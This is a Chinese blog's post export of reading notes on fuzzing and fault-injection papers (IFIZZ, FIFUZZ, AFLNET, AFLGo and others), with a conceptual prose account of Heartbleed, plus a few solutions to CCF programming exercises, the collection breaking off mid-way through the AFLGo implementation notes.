[{"content":"因为之前一直在本地写乱七八糟的东西，某一天想搭个博客来分享。\n于是搭好了，东西一股脑的全放了上来。\n之前的文章还是有一些问题的，比如图片不加载（码云防盗链，之后拿github做图床了），公式不渲染等等。\n2023年7月后的文章应该不会有这些问题了（大概吧\u0026hellip;\u0026hellip;）\n","permalink":"https://juhuax.github.io/posts/%E5%BB%BA%E7%AB%99/%E5%AF%B9%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E8%AF%B4%E6%98%8E/","summary":"因为之前一直在本地写乱七八糟的东西，某一天想搭个博客来分享。 于是搭好了，东西一股脑的全放了上来。 之前的文章还是有一些问题的，比如图片不加载（","title":"对一些问题的说明"},{"content":"中文译名：IFIZZ: 深度状态和高效的故障场景生成来测试物联网固件\n作者：刘peiyu\n单位：浙江大学\n国家： #中国\n年份： #2021年\n来源： #IEEE_ASE_CCFB 关键字： #fuzzing #故障注入\n代码地址：decentL/iFIZZ-ASE21 (github.com)\n笔记建立时间： 2023-07-06 10:39\n#TODO\n摘要 现有模糊测试不能有效的测试物联网设备的错误处理代码 错误处理代码难触发 难以深入错误处理代码路径（因为一触发错误处理代码程序就嘎了） IFIZZ，一个专门设计用于测试基于linux的物联网固件中的错误处理代码的新的错误检测系统。 首先采用基于二进制的自动化方法，通过分析闭源物联网固件中的错误和错误条件来识别实际的运行时错误 然后采用状态感知和有界错误生成来有效地到达深度错误路径 背景 物联网设备中的错误 输入相关错误：由无效输入引起，相对较少 输入无关错误：偶尔的运行时事件（如内存耗尽、硬件故障、网络不可达）引起的输入无关错误更为常见 故障注入用于测试物联网固件的错误处理代码的挑战 如何自动识别与输入无关的错误（基于二进制的自动化识别方法解决） 测试如何深入错误路径（状态感知和有界错误生成解决） 方法 预定义 基于二进制文件的自动运行时错误识别 作者在分析了20个EF后，得到EF的两个特征\n返回值是error code 与输入无关 基于此作者设计了EF识别算法。 首先扫描汇编代码收集二进制程序中所有函数的的所有返回值（getreturnvalues ()）和caller（getcallers ()） 然后算法检查函数f的caller是否对函数f的返回值进行了check（ischecked ()），如果ischecked则说明该返回值是error code 对得到的error code在函数f中向后搜索找到error code如何生成（也就是检查条件 getcondition ()） 对得到的code condition执行向后的过程间数据流分析，收集codecondition依赖的source，检查这个source是否是程序参数（也就是是否和输入相关），如果不是，则该error code是我们要的。 状态感知和有界故障场景生成 （这个方法是为了覆盖尽可能多的错误路径、在有限的时间内到达深度错误路径）\n作者指出在故障注入的时候会产生两个问题：\nearly crashes：一个RT中有很多error site，触发一个就会导致程序崩溃，如果在RT早期程序就崩溃了，那么后面的error site就覆盖不到了——状态感知解决 遍历生成FS会产生相当多的数量（爆炸）——有界故障生成解决 状态感知 作者通过将每次的崩溃的error site和site state记录为日志，当在运行时碰到error site时，如果此时的site和state已经记录在日志中，那么就不对这个error site进行故障注入（如line 9）。这样可以避免冗余崩溃，并且深入后续的error site。\n有界故障生成 首先，大多数崩溃都是由少量错误引起的，生成具有大量错误的故障场景通常是不必要的。因此，我们提出第一条规则: 故障场景中的最大错误数 (ME)应该是有界的 (算法2中的第2行)。其次，我们还观察到大多数崩溃是由相邻错误引起的。因此，我们提出第二条规则: 在故障场景中，第一个错误和最后一个错误 (MBE)之间的最大距离 (即错误站点的数量)也应该是有界的 (算法2中的第4行)。\n实现 error-function analyser：FIRMADYNE对固件解包，IDA脚本分析二进制程序 Firmware packer：设置被测对象，使其可以用于测试 Fault-scenario generator：编写了一个库函数利用劫持函数来记录崩溃日志和故障注入 Runtime monitor：运行测试固件并跟踪运行时进程信息，以获得目标物联网程序及其相应的运行命令（无需源代码） Bug checker：分析崩溃日志以生成崩溃报告，一个IDA脚本 存在的问题和我的疑问 在error function识别的时候存在无法处理间接调用和数据流爆炸的问题 作者指出“一旦数据流证明一个源与输入无关，分析就完成了，而不是不断地分析其他源”，但是实际上这种逻辑并不sound，必须证明所有的源都和输入无关才可以保证该error function是输入无关的 貌似只找到一个源头与输入无关便可，如果非要考虑所有源头，且不说数据流分析爆炸，最后估计一大批function被筛掉，剩下的error function没几个了。但是即便如此，最好的方法还是不断搜索源头，直到找到一个和输入无关，那么最坏情况是O(n)。比较稳妥的操作应该是设置一个阈值。 其实我一直不太清楚（包括在上下文敏感sfi那篇论文中）这个error site sequence（这篇文章称之为runtime trace）中的error site彼此是独立的还是互相有调用顺序的 Fault-scenario generator、Runtime monitor如何实现的，要知道本文不需要程序源码 “在测试固件映像之前，IFIZZ首先对被测试固件进行动态分析以获得目标程序。总的来说，IFIZZ获得112个供应商特定的程序和509个运行命令来运行这些程序”这是如何实现的 对生成RT的变异策略进行研究!!! ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/ifizz-deep-state-and-efficient-fault-scenario-generation-to-test-iot-firmware/","summary":"中文译名：IFIZZ: 深度状态和高效的故障场景生成来测试物联网固件 作者：刘peiyu 单位：浙江大学 国家： #中国 年份： #2021年 来源： #IEEE_ASE_CCFB 关键","title":"IFIZZ: Deep-State and Efficient Fault-Scenario Generation to Test IoT Firmware"},{"content":"中文译名：灰盒模糊的学习种子自适应突变策略\n作者： Myungho Lee\n单位：韩国大学\n国家： #韩国\n年份： #2023年\n来源： #ICSE_CCFA\n关键字： #fuzzing #突变策略\n代码地址： https://github.com/kupl/SeamFuzz-public\n笔记建立时间： 2023-07-02 09:55\nSEAMFUZZ：学习灰盒模糊测试的种子自适应突变策略｜技术进展 (qq.com)\n流程图 方法 种子聚类 定义了相似度得分 $score_{sim}$ 。\n相似度分数包括语法相似性得分、语义相似性得分、稀有度相似性得分。\n概率分布学习 学习针对每个种子组选择有效变异方法的概率分布。\n首先定义了一个采样空间，然后进行汤普森采样。\n非自己方向，随便看看哈哈。😂\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/learning-seed-adaptive-mutation-strategies-for-greybox-fuzzing/","summary":"中文译名：灰盒模糊的学习种子自适应突变策略 作者： Myungho Lee 单位：韩国大学 国家： #韩国 年份： #2023年 来源： #ICSE_CCFA 关键字： #fuzzing #突变策略 代码地址： https://github.com/kupl/SeamFuzz-public 笔记","title":"Learning Seed-Adaptive Mutation Strategies for Greybox Fuzzing"},{"content":"中文译名：使用上下文敏感软件故障注入模糊化错误处理代码 作者：蒋mingzhu\n单位：清华大学\n国家： #中国\n年份： #2020年\n来源： #USENIX会议\n关键字： #fuzzing #故障注入\n代码地址：\n笔记建立时间： 2023-06-29 10:36\n这篇文章的作者和 [[Fuzzing Error Handling Code in Device Drivers Based on Software Fault Injection]] 一样，是进一步的后续工作。\nAbstract FIFUZZ的核心是上下文敏感的软件故障注入 (SFI)方法，该方法可以有效覆盖不同调用上下文中的错误处理代码，从而发现隐藏在复杂上下文中的错误处理代码中的深层错误。 Background 现有的基于sfi的方法存在一个关键的限制: 据我们所知，它们只执行上下文（执行路径）不敏感的故障注入，这通常会阻止测试的深入。可能某些错误会在特定的调用上下文中才会被触发。 举例 函数P存在double free漏洞，但是如果是上下文不敏感的故障注入，在函数P的错误处理代码（if）中注入故障，每次执行到函数A程序就会触发故障而不会到达函数B，也就不会触发double free错误，如果进行上下文敏感的故障注入，只有在函数B调用函数P的时候引入故障，那么就可以触发double free错误。\n方法 Error Sequence Model 在 [[Fuzzing Error Handling Code in Device Drivers Based on Software Fault Injection]] 的error site序列（$ErrSeq = [ErrPt1, ErrPt2, \u0026hellip;, ErrPtx], ErrPti = {0, 1}$）的基础上，作者增加了执行错误站点时的运行的调用堆栈作为上下文 $ErrPt =\u0026lt; ErrLoc,CallCtx \u0026gt;$ $CallCtx$ 就是上下文 $CallCtx = [CallIn f o1,CallIn f o2, \u0026hellip;,CallIn f ox]$ $CallIn f o =\u0026lt; CallLoc, FuncLoc \u0026gt;$ callloc应该是该函数的位置，funcloc是该函数调用的函数的位置（应该是这样吧） 作者存储相关信息的结构就是Errpt的hash作为键，0/1作为值 作者指出，因为要考虑上下文，所以故障注入不能再静态的注入，而是要动态的进行注入。比如说当一个error site等待注入，但是有N个上下文，那么实际上相当于要注入N个不同的error site\nContext-Sensitive SFI-based Fuzzing 1)静态地识别测试程序源代码中的错误位置; 2)运行测试程序，收集每个执行错误站点的调用上下文和代码覆盖率的运行时信息; 3)根据运行时信息创建已执行错误位点的错误序列; 4)运行程序后，对每个已创建的错误序列进行变异，生成新的序列; 5)运行被测程序，根据变异后的错误序列，在特定调用上下文的错误位点注入故障; 6)收集运行时信息，创建新的错误序列，并对这些错误序列再次进行变异，构建一个模糊循环。当没有新的错误序列产生或达到时间限制时，模糊循环结束。\n框架 Error-site提取器。它对测试程序的源代码执行自动的静态分析，以识别可能的错误位置。\n程序生成器。它对程序代码执行代码检测，包括识别错误位置、函数调用、函数入口和退出、代码分支等。它生成一个可执行的测试程序。\n对代码进行插桩，有两个目的: 收集有关错误站点的运行时信息和注入错误。 为了收集每个错误点的运行时调用上下文的信息，程序生成器在对被测试程序代码中定义的每个函数调用之前和之后，以及在每个函数定义的入口和出口处测量代码。 为了监视错误点的执行并对其进行错误注入，程序生成器在每个错误点前编写代码。 运行时监视器。它使用生成的输入运行被测程序，收集被测程序的运行时信息，并根据生成的错误序列执行故障注入。\n错误序列生成器。它创建错误序列，并根据收集的运行时信息改变错误序列以生成新的错误序列。\n输入发生器。根据收集到的运行时信息，它执行传统的模糊处理来改变和生成新的输入。\nBug检查器。它们检查收集的运行时信息以检测错误并生成错误报告。\n（和原先的一篇基本一样，多了一个输入发生器）\n疑问 其实和上一篇一样，对error-site的模糊是何意？既然是为了提升覆盖率，全给他触发不就行了么。 具体每个步骤是如何实现的，作者并没有开源代码 收获 其实这篇文章最大的收获就是如何将一篇B扩充到一篇A。这篇文章是基于Fuzzing Error Handling Code in Device Drivers Based on Software Fault Injection进行升级的，相较于原来的文章，作者做出了以下几点提升：\n在原先的基础上对error-site增加了上下文——模型建模更精细化，复杂化 error-site提取的时候，考虑了库函数的情况，而且采用了统计的方法进一步提高识别的精度——方法步骤复杂化，增加未曾考虑的情况 不再只聚焦于驱动程序，将范围扩大到所有程序 在fuzz过程中增加了传统fuzz，之前只有对error-sites sequence的fuzz 目的： 方法： 意义： 效果：\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fuzzing-error-handling-code-using-context-sensitive-software-fault-injection/","summary":"中文译名：使用上下文敏感软件故障注入模糊化错误处理代码 作者：蒋mingzhu 单位：清华大学 国家： #中国 年份： #2020年 来源： #USENIX","title":"Fuzzing Error Handling Code using Context-Sensitive Software Fault Injection"},{"content":"中文译名：基于软件故障注入的设备驱动程序模糊错误处理代码 作者：蒋mingzhu 单位： 清华大学 国家： #中国 年份： #2019年 来源： #IEEE_ISSRE_CCFB 关键字： #fuzzing #故障注入 代码地址： 笔记建立时间： 2023-06-27 17:15\nAbstract much error handing code in drivers is triggered by occasional errors (such as insufficient memory and hardware malfunctions) that not related to inputs this method based on software fault injection firstly, at complie time, FIZZER uses static analysis to reccommend possible error sites that can trigger error handling code. Then, during driver execution, by analyzing runtime information, it automatically fuzzes error-site sequences for fault injection to improve code coverage. Background current fuzzing approches for driver has two limitations:\ncannot generate original driver inputs PeriScope can simulate and fuzz the driver inputs from the hardware device to perform runtime testing cannot effectively cover error handling code take SFI to cover error handling code at runtime The author thinks that there are two kinds of errors in general, one is input-related error and the other is occasional errors The authors surveyed the error handling code in the Linux kernel and the errors committed by skzkaller to find out how many of these error handling code and bugs were related to occasional errors.\nMethodology basic idea error site: some function can trigger some fault then trigger the error handling code error-site sequence: multiple eorror sites ordered by their static positions in the driver source code author regard error-site sequences as the \u0026ldquo;inputs\u0026rdquo; of possibly encountered error, and then fuzz these sequences to cover the error handling code method statically identify error sites in the driver code run the driver, and then according to the runtime information of the driver, use a coverage-based mutation method to generate error-site sequences to cover error handling code Initial mutation: 初始error-site序列是全零，然后执行一次fuzz，其中可能有的error site被执行，如下图中间标Y的0，那么初次免疫就是针对这些成功执行的error site的，如下图右边。（突变方法通过使一个已执行的错误位点失败 (0→1)来生成每个新的错误位点序列，因为每个错误位点可能触发不同的错误处理代码） Subsequent mutation：在驱动程序的后续执行之后，如果代码覆盖率增加 (即覆盖新的代码分支或基本块)，则突变方法选择此执行的错误位点序列作为突变的种子; 否则，将放弃此错误位点序列。当这个错误位点序列发生突变时，一次只改变一个已执行的错误位点 (0→1or1→0)，因为每个错误位点可能触发不同的错误处理代码。这样，突变法就产生了一些新的错误位点序列。然后，将这些生成的错误位点序列与之前使用的错误位点序列进行比较，并删除重复的错误位点序列。、 inject faults on error sites according to the generated error-site sequences run the driver, and use the mutation method again, to generate new error-site sequences, making up a fuzzing loop. IMPLEMENTATION Error-site analyzer. It performs a static analysis of the driver source code to recommend possible error sites, from which the user should select realistic ones that can actually fail and trigger error handling code. 识别error-site的标准就是是否同时出现if语句和NULL指针或者非零整数的返回值，然后人工从静态分析得到的error sites中挑选出真正会触发error hadling code的site Driver generator. It instruments the identified error sites in the driver code and generates a loadable driver. 使用代码插桩进行故障注入：error_probe ()意思就是检测此时的error-site序列，看当前的error site应不应该触发，下图是个例子（蓝色是插桩代码） Runtime fuzzer. It uses our SFI-based fuzzing strategy to perform runtime testing. During driver execution, it collects the runtime information about the driver. Bug checkers. They check the information collected by the runtime fuzzer to detect bugs. 实现了两个检查器来检测资源泄漏和双锁错误，并使用两个第三方检查器，即KASAN[23]来检测内存损坏错误，Kmemleak[24]来检测内存泄漏。 Key Information 作者在最开始统计错误处理代码的时候，使用的方式手动查找goto语句和返回的错误代码，这两种语句通常用于Linux内核中的错误处理代码 作者指出51%可以触发错误处理代码的站点与偶发错误有关。 这里变异的时候每次只变一个erro site是否fail 疑问 模糊错误序列的意义何在，既然都已经探测到error site，我全部都触发，覆盖率不就最大了吗 如何实现自动插桩的 啥事双锁错误 double-lock bugs 改进 自动识别error sites 目的： 方法： 意义： 效果：\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fuzzing-error-handling-code-in-device-drivers-based-on-software-fault-injection/","summary":"中文译名：基于软件故障注入的设备驱动程序模糊错误处理代码 作者：蒋mingzhu 单位： 清华大学 国家： #中国 年份： #2019年 来源： #IEEE_ISSRE_CCFB 关键字： #fuzzing","title":"Fuzzing Error Handling Code in Device Drivers Based on Software Fault Injection"},{"content":"中文译名：AFLNET：网络协议灰盒模糊器 作者：Van-Thuan Pham 单位：蒙纳士大学 国家： #澳大利亚 年份： #2020年 来源： #IEEE_ICST_CCFC 关键字： #fuzzing 代码地址： https://github.com/aflnet/aflnet 笔记建立时间： 2023-06-23 10:50\n现状 当前的模糊测试器对协议进行模糊测试的效果不好\n缺乏针对状态的变异策略 需要已知协议模型 方法 AFLNET使自动状态模型推理和覆盖引导模糊协同工作; 模糊化有助于生成新的消息序列来覆盖新的状态，并使状态模型逐渐更加完整。同时，动态构建的状态模型通过使用保留消息序列的状态覆盖和代码覆盖信息，帮助将模糊测试推向更重要的代码部分。 输入是捕捉的流量pcap文件 使用wireshark自动提取request序列 request sequence parser生成初始信息序列语料库 使用协议规格信息提取单个请求 首先从pcap文件中过滤出响应，利用响应跟踪client的请求 识别每个跟踪中消息的开始和结束（利用特定报头和结束符） 按照相应的服务器状态转换顺序将每个消息关联起来（通过逐个发送消息和解析响应来完成的。） 信息序列语料库的形式是信息序列的链表 State Machine Learner 利用服务器响应，并用新观察到的状态和转换增强已实现的协议状态机 (IPSM)。 通过提取response中的状态码实现 AFLnet维护一个状态语料库，包括状态条目列表（包含状态相关信息）和将状态条目列表映射到对应信息序列条目的哈希映射 Target State Selector利用IPSM的信息来选择AFLnet聚焦的下一个状态（倾向于未出现，很少出现的状态） 利用启发式算法 例如选择状态s的概率和变异后的消息序列中已执行了s的比例成反比，说人话就是s执行的越少越容易被选择 为了最大化发现新状态转换的可能性，AFLNET优先选择在以前选择时特别成功地增加了代码或状态覆盖率的状态。 值得注意的是Target State Selector在初期是随机选择，只有在积累了足够多的状态信息后才会开始利用启发式算法进行选择 Sequence Selector在Target State Selector选择了状态后，利用哈希映射选择一个可以到达已选状态的消息序列（随机选择） Sequence Mutator是用协议感知的突变操作符（protocol-aware mutation operators）增强了AFL的fuzz_one方法。 基于Sequence Selector选择的序列M生成M‘, 并且保证M\u0026rsquo;同样可以达到状态s 为了确保能M‘也可以达到状态s，AFLnet将序列M分为M1、M2、M3，只对M2进行变异，组合后得到M' M1是到达状态s的序列 M2是出于状态s的序列 M3是剩下的序列 变异的操作称之为协议感知的突变操作符，很高大上，其实还是变异的老操作（替换插入复制删除），区别是应用在消息层面，除此之外，仍然保留了字节级别的变异 如果M\u0026rsquo;出发了新状态或者新的状态转换或者出发了server的源代码的新分支，则也会被加入语料库 原文第四页给了个例子\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/aflnet-a-greybox-fuzzer-for-network-protocols/","summary":"中文译名：AFLNET：网络协议灰盒模糊器 作者：Van-Thuan Pham 单位：蒙纳士大学 国家： #澳大利亚 年份： #2020年 来源： #IEEE_ICST_CCFC 关键字： #fuzzing 代码","title":"AFLNET: A Greybox Fuzzer for Network Protocols 论文笔记"},{"content":"如此编码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 25; int n,m; int a[N],c[N],b[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; for(int i = 1; i \u0026lt;= n; i++) cin\u0026gt;\u0026gt;a[i]; c[0] = 1; c[1] = a[1]; for(int i = 2 ; i \u0026lt;= n; i++) c[i] = c[i-1] * a[i]; for(int i = 1; i \u0026lt;= n; i++){ b[i] = m % a[i]; m = m / a[i]; } for(int i = 1; i \u0026lt;= n; i++) cout\u0026lt;\u0026lt;b[i]\u0026lt;\u0026lt;\u0026#34; \u0026#34;; return 0; } 出现次数最多的数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int num[10005]; int main(){ int n, num_max; cin\u0026gt;\u0026gt;n; memset(num, 0, sizeof(num)); while(n--){ int si; cin \u0026gt;\u0026gt; si; num[si]++; if(num[num_max] == num[si]) num_max = min(num_max, si); else if(num[num_max] \u0026lt; num[si]) num_max = si; } cout \u0026lt;\u0026lt; num_max\u0026lt;\u0026lt;endl; return 0; } ISBN号码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int getnumber(char x){ return x-\u0026#39;0\u0026#39;; } int main(){ string isbn; cin \u0026gt;\u0026gt; isbn; int sum, x, c; c = 1; sum = 0; for(int i = 0; i \u0026lt; 12; i++){ if(isbn[i] != \u0026#39;-\u0026#39;){ int n = getnumber(isbn[i]); sum += c * n; c ++; } } x = sum % 11; if(getnumber(isbn[12]) == x || (isbn[12] == \u0026#39;X\u0026#39; \u0026amp;\u0026amp; x == 10)) cout\u0026lt;\u0026lt;\u0026#34;Right\u0026#34;\u0026lt;\u0026lt;endl; else { if(x == 10) isbn[12] = \u0026#39;X\u0026#39;; else isbn[12] = \u0026#39;0\u0026#39; + x; cout\u0026lt;\u0026lt;isbn\u0026lt;\u0026lt;endl; } return 0; } 在写这道题的时候发现了关于for循环作用域的一个小细节，for循环内对外部变量的初始化只针对for循环内部有效（很像函数）。当我在for循环的小括号内对变量c和sum初始化后，for循环内部正常运行，但是在外部计算sum取余11时，sum的值就变成；但是如果我在大括号内部初始化c和sum变量时，在for循环外部也可以正常使用。\n最大的矩形 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int h[1005]; int main(){ int n; cin\u0026gt;\u0026gt;n; memset(h, 0, sizeof(h)); for(int i = 0; i \u0026lt; n; i ++){ cin\u0026gt;\u0026gt;h[i]; } int ans = 0; for(int i = 0; i \u0026lt; n; i++){ int imax = 0; int hmin = h[i]; for(int j = i; j \u0026lt; n; j++){ hmin = min(hmin, h[j]); imax = max(hmin * (j - i + 1), imax); } ans = max(imax, ans); } cout\u0026lt;\u0026lt;ans\u0026lt;\u0026lt;endl; return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 n = int(input()) h = list(map(int, input().split())) ans = 0 for i in range(0, n): imax = 0 hmin = h[i] for j in range(i, n): hmin = min(hmin, h[j]) imax = max(hmin * (j - i + 1), imax); ans = max(imax, ans); print(ans) ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/13%E5%B9%B412%E6%9C%88ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/","summary":"如此编码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 25; int n,m; int a[N],c[N],b[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; for(int i = 1; i \u0026lt;= n; i++) cin\u0026gt;\u0026gt;a[i]; c[0] = 1; c[1] = a[1]; for(int i = 2 ; i \u0026lt;= n; i++) c[i] = c[i-1] * a[i];","title":"13年12月CCF计算机软件能力认证"},{"content":"#定向fuzzing\nABSTRACT 背景（问题）：现有灰盒fuzzer不能进行有效的定向fuzz 方法：基于模拟退火的power schedule，可以将更多的能量分配给更接近目标位置的种子，同时减少分配给距离目标距离更远的种子的能量。 成果：优于基于符号执行的定向白盒测试和非定向的灰盒测试；可以和谷歌持续模糊测试平台OSS-Fuzz进行整合；可以在几个模糊不清的安全关键项目（如LibXML2）中发现39个bug INTRODUCTION 定向fuzz的应用：补丁测试；崩溃重现；信息流检测\n基于符号执行的白盒定向模糊测试的问题：耗时长\nDFG：在本文中，我们介绍了定向灰盒模糊(DGF)，它专注于到达程序中给定的目标位置集。在高层次上，我们将可达性作为一个优化问题，并使用特定的元启发式来最小化生成的种子到目标的距离。为了计算种子距离，我们首先计算并测量每个基本块到目标的距离。虽然种子距离是过程间的，但我们的新度量只需要对调用图进行一次分析，对每个过程内CFG进行一次分析。在运行时，fuzzer聚合每个练习的基本块的距离值，以计算种子距离作为它们的平均值。DGF用于最小化种子距离的元启发式方法被称为模拟退火[19]，并被实现为功率调度。能量表控制所有种子[6]的能量。种子的能量是指种子发毛所花费的时间。像所有的灰盒模糊技术一样，通过将分析转移到编译时，我们可以最小化运行时的开销。\n与基于符号执行的白盒定向模糊测试的区别：DGF将目标位置的可达性作为优化问题，而现有的定向（白盒）模糊方法将可达性作为迭代约束满足问题。\n主要工作：灰盒模糊和模拟退火的整合；可以考虑多个目标、在检测时预先计算、可以运行时导出的，适用于程序间的一种正式的距离度量方法；AFLGO的实现整合和实验\nMOTIVATING EXAMPLE 以心脏滴血漏洞为例子，简单来说该漏洞原理就是没有做边界检测而导致的数据溢出。\n2.1 heartbleed and patch testing 简单的说，服务器端得到数据包，数据包长度为plen_real，而数据包中包含一个字节表明有效负载数据长度plen_fake，数据包剩下的部分是有效负载数据，长度为plen_real-1。整个数据包存储在一个char型数组之中。而服务器端构造新数据包时，先分配一段plen_fake+1的内存空间，前两个字节存放plen_fake，之后使用memcpy从收到的数据包有效负载数据起始位置向新数据包拷贝plen_fake字节数据。正常情况下plen_fake = plen_real-1，当用户有意设置plen_fake大于实际有效负载长度plen_real-1时，服务器就会发送plen_fake长度的数据，其中包括plen_fake - plen_real-1长度的数据，这些数据可能是一些用户密码或者密钥。\n作者将AFLGO和KATCH比较，KATCH是最先进的基于符号执行的自动补丁测试工具。\n2.2Fuzzing the Heartbleed-Introducing Source Code Commit 简述KATCH的工作原理：首先识别最接近目标t的基本块bi，然后构建可以到达该基本块的路径约束，接着识别决定从bi到达t的字节是哪个，最后把完整的路径约束放到SMT中求解。 基于符号执行的定向白盒模糊测试缺陷：耗时久，每探索一条路径都要重新计算距离；搜索可能不完整，解释器和求解器可能不支持语言特性或字节码；贪婪搜索可能陷入局部最优 AFLGO优势：AFLGo每秒生成并执行数千个输入，并在不到20分钟的时间内暴露Heartbleed；在运行时几乎不需要程序分析，只需要在编译/插装时进行轻量级程序分析；实现了基于模拟退火的全局搜索；实现了并行搜索，同时搜索多个目标 AFLGO测试心脏滴血流程 首先对OPENSSL插桩。对于插桩后的二进制程序，AFL负责检测代码覆盖率，AFLGO负责检测种子到目标的距离 然后使用模拟退火对OPENSSL模糊测试。 AFLGo进入探索阶段，并像AFL一样工作。在探索阶段，AFLGo随机变异提供的种子，以产生许多新的输入。如果一个新的输入增加了代码覆盖率，它将被添加到要模糊化的种子集;否则，将被丢弃。提供的和生成的种子在一个连续的循环中被模糊化。 在开发阶段，AFLGo从离目标更近的种子中产生更多的新输入，基本上不会浪费宝贵的时间去模糊太远的种子。AFLGo根据作为功率调度实现的退火函数，慢慢地从探索阶段过渡到开发阶段。 3 TRCHNIQUE 3.2Measure of Distance between a Seed Input and Multiple Target Locations 为函数调用图和基本块级的CFG中的每个节点分配一个值。\n将距离为f (n,n\u0026rsquo;)的函数定义为调用图CG中函数n和n\u0026rsquo;之间沿最短路径的边数。我们将函数n与目标函数Tf之间的函数级目标距离df(n,Tf)定义为n与任何可达目标函数tf∈Tf之间的函数距离的调和平均值\nm是基本块，n是函数\nR（n,Tf）是所有可以从n到达的目标函数集合\ndb(m1,m2)是基本块m1和m2之间沿着最短路径的边数。\nN(m)是基本块m调用的函数集合\nT是图Gi中的基本块的集合\nGi是控制流图\n基于上面的定义，基本块m到目标基本块Tb的距离为这个\n种子s到目标基本块Tb的距离（normalized seed distance）为这个（种子的路径包含的基本块到目标基本块的和除以种子路径包含基本块的数量） $$d(s,T_{b})=\\frac{\\sum_{m\\in\\xi(s)}d_{b}(m,T_{b})}{|\\xi(s)|} $$\n作者还定义了normalized seed distance $$\\tilde{d} (s,T_b)$$，这是种子s到目标基本块Tb的距离和种子序列中与目标基本块Tb的最小距离的差值比上最大距离和最小距离的差值 $$ \\tilde { d } ( s , T _ { b } ) = \\frac { d ( s , T _ { b } ) - \\mathrm { m i n D } } { \\mathrm { m a x } \\mathrm { D - m i nD } } $$\n注意：函数级和基本块级的距离计算是在插桩的时候，也就是fuzz开始之前预先计算好的。而上文中的mormalized seed distance是在fuzz中基于预先算好的函数间或基本块间的距离进行计算，因为有预计算的存在，所以运行中计算并不会太耗时\n3.3 Annealing-based Power Schedules 作者给出了基于模拟退火算法的种子s到目标基本块Tb的能量分配公式 $$ p ( s , T _ { b } ) = ( 1 - \\tilde { d } ( s , T _ { b } ) ) \\cdot ( 1 - T _ { \\mathrm { e x p } } ) + 0 . 5 T _ { \\mathrm { e x p } } $$\n作者将模拟退火算法的能量分配和AFL原有的能量分配结合在一起： $$ \\hat { p } ( s , T _ { b } ) = p _ { \\mathrm { a f f } } ( s ) \\cdot 2 ^ { 1 0 \\cdot p ( s , T _ { b } ) - 5 } $$\n3.4 Scalability of Directed Greybox Fuzzing 作者在这里解释了AFLGO在计算节点间的目标距离的时候是如何提高效率的。AFLGO不去计算程序间控制流图，它计算两部分内容：调用图中的函数级目标距离和同一程序内控制流图中的调用点的基本块级别目标距离。计算最小距离的算法使用的是Djikstra算法，复杂度是$$O(V^2)$$，V是节点数。假如这里有n个程序内控制流图，平均每个图有m个结点，AFLGO先算n个图之间的目标距离，复杂度$$O(n^2)$$，然后算图内的每个结点目标距离，复杂度$$O(m^2)$$，整体复杂度$$O(n^2+m^2)$$。\n然后说了一下AFLGO和AFL具有同样的可拓展性，因为主要的程序分析是放在编译中，运行中其实没有太大区别。\n4 EVALUATION SETUP 给出了AFLGO的架构，但是看这意思还是需要源代码啊，不是灰盒吗。\n4.1 Implementation AFLGo图提取器(GE)生成调用图(CG)和相关的控制流图(CFGs)。CG节点由函数签名标识，CFG节点由源文件和对应基本块的第一个语句行标识。GE实现为AFL LLVM通道的扩展，由编译器AFL -clang-fast激活。编译器环境变量CC被设置为afl-clang-fast，然后构建项目。 AFLGo距离计算器(DC)采用调用图和每个过程内控制流来计算每个基本块(BB)的过程间距离，如3.2节所述。DC被实现为一个Python脚本，它使用networkx包来解析图，并根据Djikstra的算法进行最短距离计算。DC生成BB-distance文件，其中包含每个BB的基本块级目标距离。 AFLGo instrumentor获取BB-distance文件，并在目标二进制文件中测量每个BB。具体来说，对于每个BB，确定各自的BB级目标距离，并注入扩展trampoline。trampoline是一段汇编代码，在每个跳跃指令之后执行，以跟踪覆盖的控制流边缘。一条边由64kb共享内存中的一个字节标识。在64位架构上，我们的扩展使用16个额外字节的共享内存:8个字节累积距离值，8个字节记录执行的bb的数量。对于每个BB, aflgo instrumentor添加汇编代码i)加载当前积累的距离并添加当前BB的目标距离，ii)加载并增加执行BB的数量，以及iii)将两个值存储到共享内存中。该检测实现为AFL LLVM通道的扩展。编译器被设置为afl-clang-fast，编译器标志引用BB-distance文件，项目是用ASAN构建的。 AFLGo 